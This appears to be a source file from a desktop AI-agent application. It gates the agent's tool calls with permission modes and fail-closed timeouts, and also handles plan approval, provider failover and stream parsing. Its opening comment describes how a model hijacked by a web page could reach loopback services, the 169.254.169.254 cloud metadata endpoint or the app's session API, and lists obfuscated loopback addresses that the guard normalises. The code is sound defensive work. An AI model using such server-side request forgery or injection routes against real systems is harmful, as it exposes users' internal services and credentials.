// 3.0 收口走查(第四波):http_request 指向回环 / 内网 / 链路本地(含 169.254.169.254 云元数据)时返回 'internal_target'。
// http_request 是「调本机 / 内网 API」用的,不做 SSRF 拦截(那是 web_fetch / http_download 的事);修前它在智能自动档只要不像载荷就
// 免确认,被网页注入的模型可以 GET 本机其它服务、元数据端点,乃至如意自己的会话接口(token-browser 对无 Origin 的回环请求免 token)。
// 判据:先用 WHATWG URL 规范化主机(0x7f.1 / 2130706433 / 0177.0.0.1 / ::ffff:7f00:1 都还原成标准写法),再交 04h 的本机 / 局域网判据。
function httpRequestInternalTargetReason(toolName, input) {
  const bare = String(toolName == null ? '' : toolName).replace(/^.*__/, '');
  if (bare !== 'http_request' || !input || typeof input !== 'object' || Array.isArray(input)) return '';
  let host = '';
  try { host = new URL(String(input.url == null ? '' : input.url).trim()).host; } catch { return ''; }
  return host && providerBaseIsLocalOrLan('http://' + host) ? 'internal_target' : '';
}
function nativeToolGate(mode, tier, toolName, input) {
  // v1.4.3: accept both 'bypass' (internal) and 'bypassPermissions' (CLI-native) as full-bypass
  if (mode === 'bypass' || mode === 'bypassPermissions') return 'allow';
  // 安全走查 S1:联网请求看起来带了载荷 → 除 bypass 以外所有档位(含 plan、read 档)先确认;走既有的权限请求,不另造一套。
  // 第三波(复核):载荷这一问只把本来的 allow 升成 ask,【不】把 block 放宽成 ask —— plan / dontAsk 档里本来就被挡的 exec / edit 工具(http_request / browser_open 等)带长网址仍是 block。
  const payloadAsk = toolName && webPayloadReason(toolName, input) ? 'ask' : 'allow';
  if (tier === 'read') return payloadAsk;
  if (mode === 'plan' || mode === 'dontAsk') return 'block';
  // v1.4.3: 'auto' mode — AI risk-classifier decides. In the native engine we approximate:
  // allow edit-tier (low-risk, reversible) and prompt for exec-tier.
  if (mode === 'auto' && tier === 'edit') return payloadAsk;
  if (mode === 'acceptEdits' && tier === 'edit') return payloadAsk;
  if (mode === 'auto') {
    if (!toolName) return 'ask';                                    // 调用方没给名字 = 保守问
    // 2026-10:命令是拼出来 / 编码出来 / 求值出来的(强信号,06i stewardAutoAskIndirect)也停下来问 ——
    // 字面量判据看不穿它真正要跑什么。管家对这一类不代批(13l),只能用户亲自按。
    // 安全走查 S2:网络外发与读数据根密钥文件(06i stewardAutoAskSensitiveKind)同样停下来问;命令类工具才扫,编排类的任务描述文字不扫。
    // 第三波(复核 #4):摊平文本超出扫描窗口的(窗口之后没人看过)同样问 —— 见 06i stewardAutoAskScanIncomplete。
    return (payloadAsk === 'ask' || stewardToolPermanentlyExempt(toolName, input) || stewardAutoAskIndirect(input) || stewardAutoAskSensitiveKind(toolName, input) !== ''
      || stewardAutoAskScanIncomplete(toolName, input) || httpRequestInternalTargetReason(toolName, input) !== '') ? 'ask' : 'allow';
  }
  return 'ask';
}
// v0.8-S4b B3: which tools produce a change that the checkpoint journal can undo? Exactly the journaled
// file mutations (file_write/file_edit/file_delete → create/modify/delete `before` snapshots). Everything
// else (exec, desktop, network) leaves no journal entry → not auto-revertible. The permission popup shows
// this at the DECISION moment (「✓ 此操作可一键撤销」/「⚠ 此操作无法自动撤销」) — an after-the-fact undo
// card can't reassure a user who was scared off before allowing. Kept as a small set so the UI needn't
// duplicate the tier table; the event carries the boolean directly.
// v1.1-W2 (T1): move/copy/zip/unzip/download 全部走 journalRecord 存 before 快照 → 可撤销，进 REVERTIBLE。
// 名字级承诺(与内建文件工具同保真度):实际快照仍可能因越界/超限被跳过,届时该条在「本轮变更」卡上回落为不可撤销。
const REVERTIBLE_TOOLS = new Set(['file_write', 'file_edit', 'file_delete', 'file_move', 'file_copy', 'archive_zip', 'archive_unzip', 'http_download']);
function toolIsRevertible(toolName) {
  const n = String(toolName || '');
  if (REVERTIBLE_TOOLS.has(n)) return true;
  // v1.0.2-W1.5 把关补:bridged 写族(ACC write_docx/write_excel/write_pdf/write_file/delete_file)现已由
  // journalBridgedWrite 在分发前存 before 快照 → 权限弹窗的可撤销徽章与「本轮变更」卡(journal 驱动)对齐。
  // 与内建工具同保真度:名字级承诺(实际快照仍可能因越界/超限被跳过,届时该条在变更卡上回落为不可撤销)。
  return Object.prototype.hasOwnProperty.call(BRIDGED_WRITE_PATH_ARGS, unprefixedBridgedName(n));
}
// ── 第 123 波 M1 §3.2「无人值守的 ask」(37 号文;29 号文 §10 红线二)────────────────────────────
// 定时任务派出去的回合没人守着,120 s 的决定窗口对它毫无意义 —— 用户可能几小时后才回来。
// 于是调度器(13s)在派单前后【成对】写/清这张表,把这一条会话的「等多久」换成
// config.schedulerAskWaitMinutes(默认 30 分钟,钳 [1,240];测试旗 WCW_SCHEDULER_ASK_WAIT_MS 压到毫秒)。
//
// **只改「等多久」,不改「等到了怎么判」**(子集律):到时仍然走下面那条既有的
// runAutomaticInterventionDecision(action:'deny') —— 无人值守遇 ask 永远是拒,绝不自动放行。
// 这张表也【不】参与 nativeToolGate 的任何判定:它够不着 gate,只够得着 setTimeout 的那个数。
// 表是进程内的,重启即空;调度器在 finally 里删,所以一条被换过窗口的会话不会把这个值带到
// 用户后来手动发起的回合上。
const schedulerAskWaitSessions = new Map();   // sessionId -> ms(只由 13s 写)
function schedulerAskWaitOverrideMs(schedAskSessionId) {
  const ms = Number(schedulerAskWaitSessions.get(String(schedAskSessionId || '')));
  return Number.isFinite(ms) && ms > 0 ? ms : 0;
}
// 128f-⑪:「等多久」的唯一判据在 04 的 permissionWaitMs;定时任务这一格在这里填上(04 拼在前面,够不着本文件)。
PermissionWaitHooks.scheduler = schedulerAskWaitOverrideMs;

// Ask the UI to approve a native tool call — reuses the pendingPermissions + /api/permission/decision bridge.
// v0.8-S4b: the permission_request event now also carries `tier` (read|edit|exec) and `revertible` (bool)
// so the popup can render a risk badge + a plain-language revertibility line without re-deriving them.
// 第27f波:pause = { enabled, ttlMs, onPause(requestId) } —— 无人值守回合的权限超时【存档暂停】。基础超时到点后不立即拒杀,
// 而是打检查点(onPause)+ 发 permission_paused 事件 + 把决定窗口延长到 ttlMs;窗口内仍可经 /api/permission/decision 决定,
// 到 ttlMs 无人应答则回落 deny(fail-closed)。entry.timer 在 Map 里被重赋为 TTL 定时器,故 clearPendingPermissions/decision 照常清对。
function requestNativePermission(sessionId, toolName, input, onEvent, timeoutMs, tier, pause) {
  return new Promise(resolve => {
    const requestId = makeId('perm');
    onEvent({ type: 'permission_request', requestId, toolName, input, tier: tier || 'exec', revertible: toolIsRevertible(toolName) });
    registerIntervention(sessionId, 'permission', requestId, {
      toolName: String(toolName || ''), tier: tier || 'exec', revertible: toolIsRevertible(toolName),
      // Wave 81: persist the concrete scope shown by the classic prompt so a cross-session
      // decision never degrades into a context-free approval.
      input: input && typeof input === 'object' && !Array.isArray(input) ? input : {},
    });
    let settled = false;
    const settle = (decision, opts = {}) => {
      if (settled) return;
      settled = true;
      // 75b command-core callers persist the CAS terminal row themselves. Automatic timeout/teardown
      // callers omit this flag and keep the legacy self-settling behavior.
      if (opts.skipInterventionSettle !== true) {
        settleIntervention(sessionId, requestId, decision && decision.behavior === 'allow' ? 'allowed' : 'denied', { decidedBy: decision && decision.behavior === 'allow' ? 'user' : 'auto', note: decision && decision.message ? String(decision.message).slice(0, 500) : '' });
      }
      try { onEvent({ type: 'permission_decision', requestId, behavior: decision && decision.behavior === 'allow' ? 'allow' : 'deny', message: decision && decision.message }); } catch { /* stream gone */ }
      resolve(decision);
    };
    // 128f-⑪:调用方传进来的 timeoutMs 已经是 permissionWaitMs 的结果(09／05b);定时那一格在这里再认一次是双保险。
    const baseMs = schedulerAskWaitOverrideMs(sessionId) || promptWaitMs(timeoutMs);   // 0 = 不限时(04 promptWaitMs)
    // deadlineAt:13q 的 steward.deferred 要告诉用户「还等你多久」(存档暂停那一支延长后另算,见下)。
    const entry = { resolve: settle, sessionId, timer: null, deadlineAt: Date.now() + baseMs };
    if (pause && pause.enabled) {
      entry.timer = setTimeout(() => {
        try { if (pause.onPause) pause.onPause(requestId); } catch { /* 检查点失败不阻断 */ }
        try { onEvent({ type: 'permission_paused', requestId, toolName, tier: tier || 'exec', ttlMs: pause.ttlMs }); } catch { /* stream gone */ }
        entry.deadlineAt = Date.now() + Math.max(60000, Number(pause.ttlMs) || 2700000);   // 128f-⑪:存档暂停把窗口延长了
        entry.timer = setTimeout(() => {
          const message = '权限已存档暂停但在时限内无人决定,已回落拒绝';
          runAutomaticInterventionDecision({
            missionId: sessionId, interventionId: requestId, source: 'timeout_permission', decidedBy: 'timeout',
            idempotencyKey: `timeout:${requestId}`, payload: { action: 'deny', message },
          }, () => {
            if (pendingPermissions.get(requestId) !== entry || entry.commandApplying) return;
            pendingPermissions.delete(requestId);
            settle({ behavior: 'deny', message, pausedTimeout: true });
          });
        }, Math.max(60000, Number(pause.ttlMs) || 2700000));
      }, baseMs);
    } else {
      entry.timer = setTimeout(() => {
        const message = 'permission prompt timed out';
        runAutomaticInterventionDecision({
          missionId: sessionId, interventionId: requestId, source: 'timeout_permission', decidedBy: 'timeout',
          idempotencyKey: `timeout:${requestId}`, payload: { action: 'deny', message },
        }, () => {
          if (pendingPermissions.get(requestId) !== entry || entry.commandApplying) return;
          pendingPermissions.delete(requestId);
          settle({ behavior: 'deny', message });
        });
      }, baseMs);
    }
    pendingPermissions.set(requestId, entry);
  });
}

// v0.9-S5: does a first assistant message look like a PLAN? Tolerant: strip leading whitespace, then accept
// `PLAN:` (any case) or the Chinese 「计划:」/「计划：」. Returns true so the caller enters the plan pause; a
// non-matching first answer falls back to the legacy hard-block plan behavior (backward compatible).
function looksLikePlan(text) {
  const t = String(text || '').replace(/^\s+/, '');
  return /^plan\s*[:：]/i.test(t) || /^计划\s*[:：]/.test(t);
}
// v0.9-S5: emit a `plan` event and PAUSE the turn until the UI decides (or the timeout auto-rejects). Mirrors
// requestNativePermission but on the plan channel. Resolves { decision:'approve'|'reject', note? }. The
// timeout is REJECT (per spec: 超时=permissionTimeoutMs → 视为 reject). clearPendingPlans (abort/stop/turn-end)
// also settles the promise as reject so the awaiting loop can never hang.
function requestPlanApproval(sessionId, markdown, onEvent, timeoutMs) {
  return new Promise(resolve => {
    const planId = makeId('plan');
    onEvent({ type: 'plan', planId, markdown: String(markdown || '') });
    registerIntervention(sessionId, 'plan', planId, { planSummary: String(markdown || '').slice(0, 500) });
    let settled = false;
    const settle = (decision, opts = {}) => {
      if (settled) return;
      settled = true;
      if (opts.skipInterventionSettle !== true) {
        settleIntervention(sessionId, planId, decision && decision.decision === 'approve' ? 'approved' : 'rejected', { decidedBy: decision && decision.decision === 'approve' ? 'user' : 'auto', note: decision && decision.note ? String(decision.note).slice(0, 500) : '' });
      }
      try { onEvent({ type: 'plan_decision', planId, decision: decision && decision.decision === 'approve' ? 'approve' : 'reject', note: decision && decision.note }); } catch { /* stream gone */ }
      resolve(decision);
    };
    const timer = setTimeout(() => {
      const note = 'plan approval timed out';
      const entry = pendingPlans.get(planId);
      runAutomaticInterventionDecision({
        missionId: sessionId, interventionId: planId, source: 'timeout_plan', decidedBy: 'timeout',
        idempotencyKey: `timeout:${planId}`, payload: { action: 'reject', feedback: note },
      }, () => {
        if (pendingPlans.get(planId) !== entry || (entry && entry.commandApplying)) return;
        pendingPlans.delete(planId);
        settle({ decision: 'reject', note });
      });
      // 123-M1:计划审批与权限请求同一条口径 —— 无人值守回合等 schedulerAskWaitMinutes,到时仍是【拒】。
    }, schedulerAskWaitOverrideMs(sessionId) || promptWaitMs(timeoutMs));   // 0 = 不限时(04 promptWaitMs)
    pendingPlans.set(planId, { resolve: settle, sessionId, timer, markdown: String(markdown || '') });
  });
}

// v1.0-S6 (B): provider endpoint FAILOVER (备用端点故障转移). Strict boundary — we switch endpoints ONLY on a
// PRE-FIRST-BYTE failure, because a mid-stream re-issue would REPLAY already-emitted content (duplication).
//   • connect-class transport failure (the socket never delivered a usable response): ECONNREFUSED /
//     ETIMEDOUT / ENOTFOUND / EHOSTUNREACH / EAI_AGAIN / ECONNRESET / TLS handshake failure / a generic
//     "fetch failed" the runtime raised before any body byte;
//   • HTTP 502 / 503 / 504 observed at the RESPONSE-HEADER stage (upstream gateway unavailable).
// NOT a failover trigger (换端点无益 or would mask a real error): 400/401/403/404/422/429 (auth/request/
// rate-limit — see the caller), and ANY failure once the SSE body has begun streaming (handled by the
// caller's existing error path, never here).
const FAILOVER_HTTP_STATUSES = new Set([502, 503, 504]);
// Connect-class Node error codes worth failing over on (a fresh endpoint may succeed).
const FAILOVER_CONNECT_CODES = new Set(['ECONNREFUSED', 'ETIMEDOUT', 'ENOTFOUND', 'EHOSTUNREACH', 'EAI_AGAIN', 'ECONNRESET']);
// Classify a caught fetch throw (pre-first-byte). Returns a short reason token when it is failover-eligible
// connect-class, else null. Inspects the error's `code` (Node/undici surfaces the syscall code on `.cause`
// too), plus TLS/"fetch failed" message fragments the runtime uses when no `code` is attached.
function failoverConnectReason(err) {
  if (!err) return null;
  const code = String((err && err.code) || (err && err.cause && err.cause.code) || '').toUpperCase();
  if (code && FAILOVER_CONNECT_CODES.has(code)) return 'connect';
  const msg = String((err && err.message) || '');
  if (/certificate|tls|ssl|self[- ]signed|handshake|DEPTH_ZERO|UNABLE_TO_VERIFY/i.test(msg)) return 'tls';
  // undici raises a bare "fetch failed" (with the real cause nested) for connect refusals/DNS — treat as connect.
  if (/fetch failed|ECONNREFUSED|ENOTFOUND|ETIMEDOUT|EHOSTUNREACH|ECONNRESET|EAI_AGAIN|network|socket hang up/i.test(msg)) return 'connect';
  return null;
}
// Session-scoped sticky endpoint memory: provider.id → last base that STREAMED successfully this serve
// process. Not persisted (in-memory only, per spec). Cleared implicitly on process exit.
const failoverStickyBase = new Map();

// 58 号方案批 1:04i 协议登记表要用的四个环内工具在这里一次填好 —— 04i 直接引用它们会被拽进唯一大 SCC(见 04i 头注)。
// 单文件加载即执行,早于任何一次请求。
Object.assign(ProviderWireHooks, { makeId, redact, repairProviderHistoryPairing, repairProviderHistoryToolArgs });

// 21-E3: 已执行动作的参数历史双视图 —— 纯函数(可 e2e 直测)。execution/audit view 保留完整 rawArgs
// (session.actionAudit + providerHistory 原消息),provider model view 投影为紧凑 envelope。
// 投影纪律:只投影 status=completed 且 sha256 与原始 arguments 可校验的动作;失败/中断/待审批不瘦身;
// 只加/换 arguments 字段,tool_call id/type/function.name 原样保留(pairing 铁律不破坏)。
const ACTION_VIEW_TOOLS = new Set(['file_write', 'file_edit', 'file_delete', 'file_move', 'file_copy', 'archive_zip', 'archive_unzip', 'http_download', 'script_run', 'shell_run', 'tool_invoke_edit', 'tool_invoke_exec']);
const ACTION_VIEW_MIN_CHARS = 512;

function actionTargetMeta(toolName, args) {
  const input = (args && typeof args === 'object') ? args : {};
  const name = String(toolName || '');
  const pathKey = input.path || input.source || input.destination || input.dest || input.output || input.output_path || input.root || '';
  if (/^(script_run|file_)/.test(name) && pathKey) {
    return { kind: 'path', basename: path.win32.basename(String(pathKey)) }; // win32:模型给的是 Windows 路径,\ 与 / 都认,非 Windows 主机上也只取尾段
  }
  if (name === 'shell_run') {
    const cmd = String(input.command || '');
    return { kind: 'cmd', basename: cmd.slice(0, 40) || (name === 'shell_run' ? 'shell' : 'powershell') };
  }
  if (/^tool_invoke_/.test(name)) {
    return { kind: 'proxy', basename: String(input.name || '') };
  }
  return { kind: 'path', basename: pathKey ? path.win32.basename(String(pathKey)) : '' };
}

function buildActionEnvelope(toolName, args, rawArgs) {
  const sha256 = crypto.createHash('sha256').update(String(rawArgs || '')).digest('hex');
  const target = actionTargetMeta(toolName, args);
  return {
    _ruyiActionRef: 'action-v1:ref', // 占位;实际 ref 由 audit 条目给出(turnSeq:toolCallId)
    target: { ...target, pathHash: crypto.createHash('sha1').update(String(target.basename || '')).digest('hex').slice(0, 12) },
    operation: String(toolName || ''),
    payload: { chars: Buffer.byteLength(String(rawArgs || ''), 'utf8'), sha256 },
    status: 'completed',
  };
}

// 返回 { history, changed } —— 浅投影:只对命中 audit 且校验通过的 assistant.tool_calls 替换 arguments。
function projectActionModelView(history, auditMap) {
  if (!Array.isArray(history) || !(auditMap instanceof Map) || auditMap.size === 0) return { history, changed: false };
  let changed = false;
  const projected = history.map(m => {
    if (!m || typeof m !== 'object' || m.role !== 'assistant' || !Array.isArray(m.tool_calls)) return m;
    let msgChanged = false;
    const toolCalls = m.tool_calls.map(tc => {
      if (!tc || tc.id == null) return tc;
      const entry = auditMap.get(String(tc.id));
      if (!entry || entry.status !== 'completed' || !entry.sha256) return tc;
      if (!ACTION_VIEW_TOOLS.has(entry.toolName)) return tc; // 防御双保险:仅投影白名单写动作
      const rawArgs = String((tc.function && tc.function.arguments) || '');
      if (Buffer.byteLength(rawArgs, 'utf8') < ACTION_VIEW_MIN_CHARS) return tc;
      if (crypto.createHash('sha256').update(rawArgs).digest('hex') !== entry.sha256) return tc; // 校验失败不投影
      let args; try { args = JSON.parse(rawArgs); } catch { return tc; } // 对抗:A4 malformed arguments 不投影(拒绝生成空 envelope)
      msgChanged = true;
      const env = buildActionEnvelope(entry.toolName, args, rawArgs);
      env._ruyiActionRef = entry.actionRef || env._ruyiActionRef;
      return { ...tc, function: { ...(tc.function || {}), arguments: JSON.stringify(env) } };
    });
    if (!msgChanged) return m;
    changed = true;
    return { ...m, tool_calls: toolCalls };
  });
  return { history: projected, changed };
}

// One streaming chat/completions call. Emits assistant_delta / thinking_delta / raw_line live; returns
// { text, reasoning, toolCalls:[{id,name,rawArgs}], finishReason, httpError, toolsRejected }.
// v1.0-S6 (B): pre-first-byte failures are surfaced structurally so the caller can decide failover:
//   • a caught fetch throw BEFORE any body byte → { transportError, transportReason:<'connect'|'tls'>, ... }
//     (only when failover-eligible; a non-eligible throw — e.g. an AbortError — is re-thrown to the caller);
//   • a non-ok response whose status is 502/503/504 → the returned httpError object also carries
//     { failoverStatus:<502|503|504> } so the caller can advance. A throw that happens AFTER streaming has
//     started still propagates normally (caller's error path; no failover — 防重放).
// 协议(58 号批 1):请求体的形状与流式事件语法都住在 04i 的协议登记表 —— 这里只管传输:发请求、首字节前的传输失败与
// failover 判定、400 归因(工具被拒 / 超窗 / stream_options)、SSE 分帧(空行分事件、多行 data: 拼接、[DONE])、raw_line;
// 每一帧交给 protocol.createStreamDecoder 的解码器,非流式回体交给 protocol.decodeCompletion。调用方(09/08)显式传
// protocol;没传(老调用点、单测)时按请求体形状认(Responses 用 input 项,chat 用 messages)。
async function openAiStreamOnce({ chatUrl, headers, body, ctrl, onEvent, markUsage, rawSeqRef, touch, protocol }) {
  const wire = protocol || providerWireProtocolForBody(body);
  const doFetch = async b => {
    const requestBody = typeof PrivacyGateway !== 'undefined' ? await PrivacyGateway.beforeModelRequest(b) : b;
    await DesktopExecutionHooks.beforeModelRequest();
    if (typeof PrivacyGateway !== 'undefined') PrivacyGateway.assertPolicyAvailable();
    return fetch(chatUrl, { method: 'POST', headers, body: JSON.stringify(requestBody), signal: ctrl ? ctrl.signal : undefined });
  };
  let res;
  try {
    res = await doFetch(body);
  } catch (e) {
    // Pre-first-byte throw. An abort (user Stop / watchdog) is NOT a failover case — re-throw so the caller's
    // AbortError handling runs. A connect/TLS-class failure is surfaced structurally for the failover decision;
    // anything else is re-thrown to preserve the existing error path & attribution.
    if (e && e.name === 'AbortError') throw e;
    const reason = failoverConnectReason(e);
    if (reason) return { transportError: (e && e.message) ? e.message : String(e), transportReason: reason, text: '', reasoning: '', toolCalls: [] };
    throw e;
  }
  touch();
  // v0.9-S0 400 attribution (§0.9-S0): tighten the order in which we classify a 400.
  // The old code sniffed stream_options FIRST. But a provider that rejects a tools-bearing request
  // often phrases it as "tools are not supported here" / "function calling is not supported" — the
  // "not support" fragment matched the stream_options regex, so we stripped stream_options and RETRIED
  // WITH TOOLS, hitting the same 400 forever (v0.8-S6 收官遗留误判案例; caught while wiring FAKE_REJECT_TOOLS).
  // Fix: when the request CARRIES tools AND the error text has tool/function semantics, attribute it to
  // tools-rejected FIRST (caller retries once without tools). Only if it is NOT a tools/function 400 do we
  // fall back to the stream_options sniff. For requests WITHOUT tools the behavior is unchanged — the
  // requestHasTools guard means the tools-first branch never fires, so the stream_options path is preserved.
  const requestHasTools = Array.isArray(body.tools) && body.tools.length > 0;
  if (res && res.status === 400) {
    let t = ''; try { t = await res.text(); } catch { /* ignore */ }
    const toolsSemantics = /tool|function/i.test(t);
    // 例外:报文带【确凿】的超窗信号(OpenAI 的 code context_length_exceeded / "maximum context length")时超窗优先。
    // OpenAI 的超窗报文会写 "…11000 in the functions. Please reduce the length of the messages or functions",
    // 按下面的 tools-first 顺序会被当成「工具被拒」:整回合去掉工具重打、永远不压缩。tools 拒绝报文不会带这两个短语。
    const definiteOverflow = /context_length_exceeded|maximum context length/i.test(t) && isContextOverflowError('HTTP 400: ' + t);
    if (definiteOverflow) {
      return { httpError: `HTTP 400${t ? ': ' + redact(t.slice(0, 500)) : ''}`, contextOverflow: true, text: '', reasoning: '', toolCalls: [] };
    }
    // tools-rejected 仍最先(45f 对抗轮 P1-1 恢复既有存活路径):真实超窗报文一般不含 tool/function 字样,
    // 而 tools 拒绝报文可能带 "in this context" —— 顺序反了会把非超窗错误吸进破坏性压缩。
    if (requestHasTools && toolsSemantics) {
      // tools-rejected takes priority over the stream_options retry (§0.9-S0).
      return { httpError: `HTTP 400${t ? ': ' + redact(t.slice(0, 500)) : ''}`, toolsRejected: true, text: '', reasoning: '', toolCalls: [] };
    }
    // 第45波:context-overflow 先于 stream_options 误判 —— "invalid_request_error" 是 OpenAI 系 400
    // 的标准 type(真实 DeepSeek 超限报文正是它),而 stream_options 嗅探的正则含裸 /invalid/,会把上下文
    // 超限误吸进「剥 stream_options 静默重试」(剥了也照样超窗,纯浪费一次调用还掩盖 45b 的强压入口)。
    // (45f P1-1:判定器已收紧为「上下文×长度共现」,裸 invalid/context 字样不再命中。)
    if (isContextOverflowError('HTTP 400: ' + t)) {
      return { httpError: `HTTP 400${t ? ': ' + redact(t.slice(0, 500)) : ''}`, contextOverflow: true, text: '', reasoning: '', toolCalls: [] };
    }
    // 58 号批 2:协议内的兼容重打(Anthropic:思考块签名校验失败 → 去掉思考块;网关不认 thinking / output_config 等 → 去掉点名字段)。
    // chat / responses 恒返回 null,走下面原有的 stream_options 分支,行为不变。
    const retryBody = wire.retryOn400(body, t, { url: chatUrl });   // url:从 400 学到的 max_tokens 上限记在「这个端点 + 这个模型」名下
    if (retryBody) {
      res = await doFetch(retryBody);
    } else if (body.stream_options && /stream_options|include_usage|unsupported|unknown|not\s*support/i.test(t)) {
      // 不再认裸 invalid:OpenAI 系所有 400 的 type 都是 invalid_request_error,认它等于把每个注定失败的 400
      // 都剥 stream_options 白打第二遍。真拒收 stream_options 的端点会点名它(或说 unsupported / unknown)。
      // Some servers reject stream_options — retry once without it before failing.
      const b2 = Object.assign({}, body); delete b2.stream_options; res = await doFetch(b2);
    } else {
      return { httpError: `HTTP 400${t ? ': ' + redact(t.slice(0, 500)) : ''}`, toolsRejected: toolsSemantics, text: '', reasoning: '', toolCalls: [] };
    }
  }
  if (!res || !res.ok) {
    let d = ''; if (res) { try { d = await res.text(); } catch { /* ignore */ } }
    // v1.0-S6 (B): tag a gateway-unavailable status (502/503/504) so the caller can fail over to a backup
    // endpoint. This is still a pre-first-byte failure (we только read the error body, not an SSE stream).
    // Auth/request/rate-limit statuses (401/403/400/404/422/429) carry NO failoverStatus → caller won't switch.
    const failoverStatus = (res && FAILOVER_HTTP_STATUSES.has(res.status)) ? res.status : undefined;
    // 「工具被拒」只在 400 / 422(请求体校验类)时才有意义:修前对【所有】非 ok 状态都按 /tool|function/ 打标,
    // 一发 500 的正文里带 "function dispatcher" 就让 09 整回合去掉工具重打、回合还报 ok:true。
    const toolsRejectedStatus = Boolean(res && (res.status === 400 || res.status === 422));
    // Retry-After(429 / 503 常带;秒或 HTTP 日期,封顶 30 s):带出给调用方的退避取 max(自己的退避, 它)。没有 / 认不出不带这个键。
    const retryAfterMs = res && res.headers && typeof res.headers.get === 'function' ? providerRetryAfterMs(name => res.headers.get(name), Date.now()) : 0;
    return { httpError: `HTTP ${res ? res.status : '?'}${d ? ': ' + redact(d.slice(0, 500)) : ''}`, toolsRejected: toolsRejectedStatus && /tool|function/i.test(d), failoverStatus, ...(retryAfterMs > 0 ? { retryAfterMs } : {}), text: '', reasoning: '', toolCalls: [] };
  }
  // Non-streaming fallback: single JSON body. The protocol decoder normalizes it to the same
  // { text, reasoning, toolCalls } shape so every caller is protocol-agnostic.
  // 无视 stream:true、直接回一整份 application/json 的网关也走这里:按 SSE 分帧读它一行 data: 都找不到,
  // 修前返回空回答(工具调用、正文全丢)。content-type 声明了 event-stream 的仍按流读。
  const contentType = String((res.headers && typeof res.headers.get === 'function' && res.headers.get('content-type')) || '');
  const jsonBody = /\bjson\b/i.test(contentType) && !/event-stream/i.test(contentType);
  if (!res.body || typeof res.body.getReader !== 'function' || jsonBody) {
    const j = await res.json().catch(() => null);
    const d = wire.decodeCompletion(j, { requestModel: body.model });
    // 回体本身装着失败(200 + 顶层 error、Responses status:'failed'、Anthropic type:'error' / refusal):与流式分支一致地报 httpError。
    // 修前这里把 failed / failedDetail 全丢了,落成「空回复」,真因(额度用尽 / 拒答 / 服务端报错)用户看不到。用量照记(失败那一发也花了钱)。
    if (d.usage) markUsage(d.usage);
    if (d.failureText) {
      return { text: d.text, reasoning: d.reasoning, finishReason: 'error', toolCalls: [], httpError: redact(String(d.failureText).slice(0, 500)), providerResponseId: d.responseId };
    }
    // E6: surface reasoning before content, matching the streaming order (a non-streaming endpoint's reasoning
    // chain used to be invisible in the UI).
    if (d.reasoning) onEvent({ type: 'thinking_delta', text: d.reasoning });
    if (d.text) onEvent({ type: 'assistant_delta', text: d.text });
    return { text: d.text, reasoning: d.reasoning, toolCalls: d.toolCalls, finishReason: d.finishReason, providerResponseId: d.responseId, ...(d.providerBlocks ? { providerBlocks: d.providerBlocks } : {}) };
  }
  const reader = res.body.getReader();
  const decoder = new TextDecoder('utf-8');
  let buf = '', done = false;
  const wireDecoder = wire.createStreamDecoder({ onEvent, markUsage, requestModel: body.model });
  // Process ONE decoded SSE event object (already JSON-parsed): raw_line first, then the protocol's event grammar.
  // Returns true when this event terminates the stream (responses' completed/incomplete/failed; chat keeps
  // relying on the `[DONE]` sentinel inside handleEventBlock).
  const processEvt = (evt, rawStr) => {
    onEvent({ type: 'raw_line', line: rawStr, seq: rawSeqRef.n++ });
    return wireDecoder.feed(evt);
  };
  // E5: standard SSE framing. Events are separated by a BLANK line; within one event, multiple `data:` field
  // lines concatenate (joined by '\n') into a single payload before parsing (per the WHATWG SSE spec). The
  // old parser split on every '\n' and JSON.parsed each `data:` line alone, so an endpoint that spread one
  // JSON object across several `data:` lines (some intranet proxies / self-hosted gateways do) lost the whole
  // frame. To stay backward compatible with the overwhelmingly common one-JSON-per-line shape, when a
  // multi-line event's combined payload does not parse we fall back to parsing each data line on its own.
  const handleEventBlock = block => {
    const dataLines = [];
    for (let rawLine of block.split('\n')) {
      rawLine = rawLine.replace(/\r$/, '');
      if (!rawLine || rawLine.startsWith(':')) continue;   // blank line or comment
      if (!rawLine.startsWith('data:')) continue;          // ignore event:/id:/retry: fields
      dataLines.push(rawLine.slice(5).replace(/^ /, ''));  // strip 'data:' + one optional leading space (SSE)
    }
    if (!dataLines.length) return false;
    const joined = dataLines.join('\n').trim();
    if (joined === '') return false;
    if (joined === '[DONE]') return true;
    const combined = safeJsonParse(joined);
    if (combined) return processEvt(combined, joined); // true = terminal event (responses completed/incomplete/failed)
    // Combined payload did not parse -> treat each data line as its own complete JSON (classic shape).
    for (const dl of dataLines) {
      const d = dl.trim();
      if (!d) continue;
      if (d === '[DONE]') return true;
      const evt = safeJsonParse(d);
      if (evt && processEvt(evt, d)) return true;
    }
    return false;
  };
  while (!done) {
    let r;
    try { r = await reader.read(); }
    catch (e) {
      // 流中途断线:undici 抛的是 TypeError('terminated'),真因(other side closed / UND_ERR_SOCKET / ECONNRESET)只挂在 e.cause。
      // 把它并进 message(原错误对象照旧上抛,name / cause / 栈都在):回合的 errorMsg 与 errorClass 才看得出这是掉线。
      // 中止(用户 Stop / 看门狗)原样上抛,09 靠 e.name === 'AbortError' 认它。
      if (e && e.name !== 'AbortError' && e.cause) { try { e.message = providerThrownErrorText(e); } catch { /* 只读 message:保持原样 */ } }
      throw e;
    }
    if (r.done) break;
    touch();
    buf += decoder.decode(r.value, { stream: true });
    let m;
    // Consume every COMPLETE event (terminated by a blank line); leave any trailing partial in buf.
    while ((m = /\r?\n\r?\n/.exec(buf)) !== null) {
      const block = buf.slice(0, m.index);
      buf = buf.slice(m.index + m[0].length);
      if (handleEventBlock(block)) { done = true; break; }
    }
  }
  // Flush a trailing event that arrived without a terminating blank line (some servers omit the final one).
  if (!done && buf.trim()) done = handleEventBlock(buf);
  const out = wireDecoder.finish();
  // 截断的流:连接干净地关了,却既没有终止信号([DONE] / responses 的 completed·incomplete·failed / anthropic 的
  // message_stop)也没有 finish_reason —— 上游中途断了。修前半截回答被当作完整的成功回复落盘;现在走 httpError
  // (不带状态码,调用方不会重打,防重放)。有 finish_reason 的(个别网关省掉 [DONE])照旧算完整。
  if (!done && !out.httpError && !out.finishReason) {
    out.httpError = 'stream ended unexpectedly (connection closed before a finish_reason or end-of-stream marker)';
  }
  return out;
}

// v0.8-S7: drain the steering queue at a SAFE injection point (§4 A3). Called ONLY at the iteration
// boundary (loop top, before the next API call). A steer is a plain user string queued by /api/steer
// while this turn is live. For each queued item we:
//   • push a `[用户插话] <text>` user message into providerHistory — this is legal ONLY at a boundary
//     where the previous assistant/tool block is COMPLETE AND CONTIGUOUS (an assistant.tool_calls message
//     followed immediately by all its role:'tool' replies, nothing wedged between). The loop top satisfies
